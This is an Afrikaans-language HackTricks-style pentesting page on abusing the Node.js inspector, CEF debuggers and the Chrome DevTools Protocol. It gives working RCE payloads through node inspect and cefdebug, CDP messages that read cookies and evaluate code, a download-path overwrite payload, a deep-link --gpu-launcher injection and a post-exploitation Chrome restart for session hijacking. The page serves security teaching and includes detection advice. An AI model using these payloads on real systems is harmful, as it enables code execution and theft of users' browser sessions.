# Misbruik van Node inspector/CEF-debugger

{{#include ../../banners/hacktricks-training.md}}

Historiese praktiese voorbeelde sluit die Multimaster-deurloop en die CVE-2019-1414 Visual Studio Code-debuggeraanval in; gebruik dit as weergawe-spesifieke konteks eerder as om aan te neem dat elke huidige Electron- of Chromium-teiken dieselfde primitiewe blootstel.<sup>[[1]](#references)[[3]](#references)</sup>

## Basiese inligting

[Uit die dokumentasie](https://nodejs.org/learn/getting-started/debugging): Wanneer ’n Node.js-proses met die `--inspect`-skakelaar begin word, luister dit vir ’n debuggerkliënt. By **verstek** luister dit by gasheer en poort **`127.0.0.1:9229`**. Elke proses kry ook ’n **unieke** **UUID**.<sup>[[4]](#references)</sup>

Inspector-kliënte moet die gasheeradres, poort en UUID ken en spesifiseer om te koppel. ’n Volledige URL sal soos `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e` lyk.<sup>[[4]](#references)</sup>

> [!WARNING]
> Aangesien die **debugger volle toegang tot die Node.js-uitvoeringsomgewing het**, kan ’n kwaadwillige akteur wat aan hierdie poort kan koppel, moontlik arbitrêre kode namens die Node.js-proses uitvoer (**potensiële privilege escalation**).<sup>[[4]](#references)</sup>

Daar is verskeie maniere om ’n inspector te begin:<sup>[[4]](#references)</sup>

```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk also pauses at the start of the user script

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```

Wanneer jy ’n proses wat geïnspekteer word begin, sal iets soos hierdie verskyn:<sup>[[4]](#references)</sup>

```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```

Prosesse gebaseer op **CEF** (**Chromium Embedded Framework**) kan ’n debugger met `--remote-debugging-port=9222` blootstel. Dit stel die webblaaier via die [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) bloot, eerder as ’n Node.js-inspekteur, dus is Node.js `process`-gebaseerde payloads nie by verstek direk toepaslik nie.<sup>[[2]](#references)[[5]](#references)</sup>

Wanneer jy ’n webblaaier met debugging begin, sal iets soos die volgende verskyn:<sup>[[2]](#references)[[5]](#references)</sup>

```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```

### CDP-endpoints opspoor en beheer

Die HTTP-ontdekkingsendpunte onderskei die **browser**-WebSocket van individuele **target**- (tab-, worker-, extension-, ens.) WebSockets. Doen navraag by `/json/version` vir die browser-endpoint en `/json/list` vir targets; die teruggestuurde `webSocketDebuggerUrl`-waardes kan dan direk met CDP se JSON-RPC-agtige boodskappe beheer word.<sup>[[5]](#references)</sup>

```bash
# Browser metadata and browser-level WebSocket
curl -s http://127.0.0.1:9222/json/version | jq

# Pages/workers and their target-level WebSockets
curl -s http://127.0.0.1:9222/json/list |
  jq '.[] | {id, type, title, url, webSocketDebuggerUrl}'

BROWSER_WS=$(curl -s http://127.0.0.1:9222/json/version | jq -r .webSocketDebuggerUrl)
PAGE_WS=$(curl -s http://127.0.0.1:9222/json/list | jq -r '[.[] | select(.type=="page")][0].webSocketDebuggerUrl')
```

Koppel byvoorbeeld met `websocat "$BROWSER_WS"` en stuur `{"id":1,"method":"Target.getTargets"}` of `{"id":2,"method":"Storage.getCookies"}`. Op ’n page target (`websocat "$PAGE_WS"`), voer `Runtime.evaluate` kode in daardie renderer uit, en `Page.captureScreenshot` gee ’n base64-gekodeerde skermskoot terug. `document.cookie` kan nie `HttpOnly`-koekies openbaar nie, terwyl `Storage.getCookies` die browser se koekiestoor navraag doen.<sup>[[5]](#references)</sup>

```json
{"id":3,"method":"Runtime.evaluate","params":{"expression":"({url:location.href,title:document.title,cookie:document.cookie})","returnByValue":true}}
{"id":4,"method":"Page.captureScreenshot","params":{"format":"png"}}
```

### Blaaiers, WebSockets en die same-origin-beleid <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Webwerwe wat in 'n webblaaier oopgemaak word, kan WebSocket- en HTTP-versoeke binne die blaaier se sekuriteitsmodel maak. 'n **Aanvanklike HTTP-verbinding** is nodig om **'n unieke debugger-sessie-ID te verkry**. Die **same-origin-beleid** **verhoed** dat webwerwe **hierdie HTTP-verbinding** kan maak. Vir bykomende sekuriteit teen [**DNS rebinding-aanvalle**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** verifieer Node.js dat die **'Host'-headers** vir die verbinding óf 'n **IP-adres** óf presies **`localhost`** spesifiseer.<sup>[[4]](#references)</sup>

> [!TIP]
> Hierdie **sekuriteitsmaatreël verhoed dat die inspector uitgebuit word** om kode uit te voer deur **bloot 'n HTTP-versoek te stuur** (wat gedoen kan word deur 'n SSRF-vuln uit te buit).<sup>[[4]](#references)</sup>

### Die inspector in lopende prosesse begin

Jy kan die **sein SIGUSR1** na 'n lopende nodejs-proses stuur om dit **die inspector op die verstekpoort te laat begin**. Let egter daarop dat jy genoeg voorregte moet hê. Dit kan jou dus **bevoorregte toegang tot inligting binne die proses** gee, maar nie 'n direkte voorregte-eskalasie nie.<sup>[[4]](#references)</sup>

```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```

> [!TIP]
> Dit is nuttig in containers omdat **die proses afskakel en ’n nuwe een begin** met `--inspect` **nie ’n opsie is nie**, aangesien die **container** saam met die proses **beëindig sal word**.<sup>[[6]](#references)</sup>

### Koppel aan inspector/debugger

Om aan ’n **Chromium-gebaseerde blaaier** te koppel, kan die `chrome://inspect`- of `edge://inspect`-URL vir onderskeidelik Chrome of Edge oopgemaak word. Deur op die Configure-knoppie te klik, moet jy seker maak dat die **teikenhost en -poort** korrek gelys is. Die beeld wys ’n Remote Code Execution (RCE)-voorbeeld:<sup>[[2]](#references)[[4]](#references)</sup>

![Nadat ’n URL om toegang tot die debugger te verkry verskyn het, bv. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - Koppel aan inspector/debugger: Om aan ’n Chromium-gebaseerde blaaier te koppel, ...](<../../images/image (674).png>)

Met die **opdragreël** kan jy aan ’n debugger/inspector koppel met:<sup>[[2]](#references)[[4]](#references)</sup>

```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```

Die hulpmiddel [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) laat jou toe om **inspectors** wat plaaslik loop, te **vind** en **code** daarin in te spuit.<sup>[[2]](#references)</sup>

```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```

> [!TIP]
> Let daarop dat **NodeJS RCE exploits nie sal werk** as jy via [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) aan ’n browser gekoppel is nie (jy moet die API nagaan om interessante dinge te vind wat jy daarmee kan doen).<sup>[[2]](#references)[[5]](#references)</sup>

## RCE in NodeJS Debugger/Inspector

> [!TIP]
> As jy hierheen gekom het om uit te vind hoe om [**RCE van ’n XSS in Electron te kry, kyk asseblief na hierdie bladsy.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

Sommige algemene maniere om **RCE** te verkry wanneer jy aan ’n Node **inspector** kan **koppel**, is om iets soos die volgende te gebruik (dit lyk asof dit **nie sal werk met ’n verbinding met Chrome DevTools protocol nie**):<sup>[[2]](#references)</sup>

```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```

## Chrome DevTools Protocol Payloads

Jy kan die API hier nagaan: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/).<sup>[[5]](#references)</sup>
In hierdie afdeling lys ek net interessante dinge wat ek gevind het wat mense gebruik het om hierdie protokol te exploit.

### Chrome 136+ verstekprofielbeperking

Vanaf **Chrome 136** ignoreer Chrome `--remote-debugging-port` en `--remote-debugging-pipe` wanneer hulle op die **verstek Chrome-datagids** gerig is. Die skakelaar moet saam met ’n nie-standaard `--user-data-dir` gebruik word. Die afsonderlike enkripsiesleutel en geïsoleerde blaaierstatus daarvan verhoed dat die eenvoudige vlaggebaseerde tegniek die gebruiker se gewone geverifieerde profiel blootstel. Daar moet nie sonder verifiëring aangeneem word dat hierdie Chrome-spesifieke beperking ook vir ouer Chrome-weergawes, Chrome for Testing, Electron/CEF-toepassings of ander Chromium-afgeleides geld nie.<sup>[[14]](#references)</sup>

```bash
# Valid current-Chrome debugging setup, but this is a new isolated profile
google-chrome --remote-debugging-port=9222 --user-data-dir=/tmp/chrome-cdp-lab
```

Om dus ’n huidige Chrome-proses te sien wat slegs met `--remote-debugging-port` geloods is, bewys **nie** dat CDP aktief geword het nie. Bevestig die luisterpoort en `/json/version`, en bepaal watter profiel dit eintlik gebruik.<sup>[[14]](#references)</sup>

### Parameter Injection via Deep Links

In [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) het Rhino Security ontdek dat ’n toepassing gebaseer op CEF ’n pasgemaakte **URI** in die stelsel geregistreer het (workspaces://index.html). Dit het die volledige URI ontvang en daarna die **CEF-gebaseerde toepassing** geloods met ’n konfigurasie wat gedeeltelik uit daardie URI saamgestel is.<sup>[[8]](#references)</sup>

Daar is ontdek dat die URI-parameters URL-gedekodeer en gebruik is om die basiese CEF-toepassing te loods. Dit het ’n gebruiker toegelaat om die vlag **`--gpu-launcher`** in die **opdragreël** te **inject** en arbitrêre dinge uit te voer.<sup>[[8]](#references)</sup>

Dus, ’n payload soos:

```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```

Sal calc.exe uitvoer.<sup>[[8]](#references)</sup>

### Lêers oorskryf

Verander die vouer waarin **afgelaaide lêers gestoor gaan word** en laai ’n lêer af om die toepassing se gereeld gebruikte **bronkode** met jou **kwaadwillige kode** te **oorskryf**.<sup>[[5]](#references)[[6]](#references)</sup>

```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
  JSON.stringify({
    id: 42069,
    method: "Browser.setDownloadBehavior",
    params: {
      behavior: "allow",
      downloadPath: "/code/",
    },
  })
)
```

### Webdriver RCE en exfiltration

STAR Labs het gewys dat blootgestelde WebDriver/CDP-dienste arbitrêre lêers kan laat lees en RCE moontlik kan maak; DNS-rebinding kan in sommige konfigurasies die exploit-ketting voltooi.<sup>[[9]](#references)</sup>

ChromeDriver se WebDriver-diens verskil van Chrome DevTools/CDP. Die [`goog:chromeOptions.binary` capability](https://developer.chrome.com/docs/chromedriver/capabilities) kies die blaaieruitvoerbare lêer wat vir ’n nuwe sessie geloods word. As ’n onbevoorregte oproeper toegang kan kry tot ’n ChromeDriver-diens wat as root loop, en ’n sessie met ’n uitvoerbare lêerpad onder die oproeper se beheer kan indien, kan daardie laaiaksie die diens se voorreggrens oorsteek. ’n Leë `/sessions`-antwoord bepaal nie of nuwe sessies geskep kan word nie. Gaan die proseseienaar, werklike bereikbaarheid van die luisterpoort, sessiemagtiging, toegang tot die uitvoerbare lêer en inperking na voordat jy aflei dat die pad bruikbaar is; ’n prosesnaam of gewone poort alleen is onvoldoende. [Google se sekuriteitsriglyne](https://developer.chrome.com/docs/chromedriver/security-considerations) sê dat ChromeDriver onder ’n onbevoorregte rekening moet loop. Passiewe enumerasie moet nie ’n WebDriver-sessie skep nie.

Vir bykomende historiese gevalle van blaaieroutomatisering en Chromium-sekuriteit, sien die Counter WebDriver-skrywe en Project Zero-kwessies 773, 1742 en 1944.<sup>[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)</sup>

### Aktiveer CDP binne ’n lewendige Chromium-proses

Op Windows het [**CDP-Enabler**](https://github.com/deathflamingo/CDP-Enabler) gewys dat die command-line-beperking nie die enigste manier is om CDP te aktiveer nie: kode wat reeds in ’n bestaande `msedge.exe` kan inspuit, kan Chromium se nie-uitgevoerde `content::DevToolsAgentHost::StartRemoteDebuggingServer` oproep en die geauthentiseerde lewendige profiel blootstel sonder om die blaaier te herbegin.<sup>[[15]](#references)</sup>

Die gedemonstreerde ketting spuit ’n DLL in met `VirtualAllocEx`/`WriteProcessMemory`/`CreateRemoteThread`, vind interne Edge-simbole (eers uit PDB’s en daarna met weergawe-spesifieke byte-handtekeninge), maak die blaaiervenster ’n subklas en stuur ’n boodskap sodat die finale bedienerbegin-oproep op die blaaier se **UI thread** uitgevoer word. Die socket word aan loopback gekoppel; daarna kan gewone CDP-primitiewe koekies ophaal, oortjies vaslê, netwerkverkeer inspekteer of JavaScript in geauthentiseerde bladsye evalueer.<sup>[[15]](#references)</sup>

> [!WARNING]
> Dit is ’n **post-compromise/process-injection**-tegniek, nie ’n netwerkomseiling sonder verifikasie nie. Dit is hoogs afhanklik van die bouweergawe omdat die relevante C++-simbole nie uitgevoer word nie en handtekeninge ná blaaieropdaterings kan verander.<sup>[[15]](#references)</sup>

Moenie vir opsporing net op `--remote-debugging-*`-command-line-telemetrie staatmaak nie: korreleer ook ongewone handles en geheuebewerkings teen blaaierprosesse (`PROCESS_VM_OPERATION`, `PROCESS_VM_WRITE`, thread-skepping), DLL-inspuiting en onverwagte loopback-luistersokke wat deur Chrome/Edge besit word.<sup>[[15]](#references)</sup>

### Post-Exploitation

In ’n werklike omgewing en **nadat jy** ’n gebruiker se rekenaar gekompromitteer het waarop ’n Chromium-gebaseerde blaaier gebruik word, was ’n historiese tegniek om die blaaier met debugging geaktiveer te herbegin en die loopback-poort aan te stuur. Dit kan die slagoffer se blaaierstatus blootstel op produkte/bouweergawes wat steeds die gekose profiel aanvaar, maar Chrome 136+ sal dit nie op sy verstekdatagids toepas nie.<sup>[[7]](#references)[[14]](#references)</sup>

Die oorspronklike herbeginopdrag word hieronder bewaar vir ouer/weergawe-spesifieke teikens. Die tweede opdrag is die ondersteunde vorm vir huidige Chrome, maar dit skep ’n geïsoleerde profiel eerder as om die slagoffer se gewone geauthentiseerde status te heropen.<sup>[[7]](#references)[[14]](#references)</sup>

```powershell
# Historical: verify whether the target actually honors it
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"

# Current Chrome: CDP works, but against a new profile
Start-Process "Chrome" "--remote-debugging-port=9222 --user-data-dir=$env:TEMP\chrome-cdp"
```

Vir macOS-spesifieke Chromium-herbegin-, uitbreiding- en CDP-tegnieke, sien [macOS Chromium Injection](../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md).



## References

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - CEF/Chromium-debuggerinspeksie- en uitbuitingstool](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414: Afstandkode-uitvoering via Chrome DevTools Debugger in Visual Studio Code](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Node.js-ontfoutingsgids - Aan die gang](https://nodejs.org/learn/getting-started/debugging)
- [5] [Chrome DevTools Protocol](https://chromedevtools.github.io/devtools-protocol/)
- [6] [corCTF 2021 Writeup - saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Post-Exploitation: Misbruik van Chrome se ontfoutingsfunksie om blaaisessies op afstand waar te neem en te beheer](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112: Afstandkode-uitvoering in AWS WorkSpaces](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [Praat jy met my? - WebDriver RCE via DNS Rebinding en CDP (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [Counter Webdriver - Van bot tot RCE](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Google Project Zero-kwessie 773 (Chromium-foutspoorder)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Google Project Zero-kwessie 1742 (Chromium-foutspoorder)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Google Project Zero-kwessie 1944 (Chromium-foutspoorder)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
- [14] [Veranderinge aan skakelaars vir afstandontfouting om sekuriteit te verbeter - Chrome for Developers](https://developer.chrome.com/blog/remote-debugging-port)
- [15] [CDP in 'n lopende Edge-blaaier inspuit: 'n Diepgaande blik op runtime-blaaierinstrumentasie](https://deathflamingo.com/blog/cdp_enabler/)
{{#include ../../banners/hacktricks-training.md}}
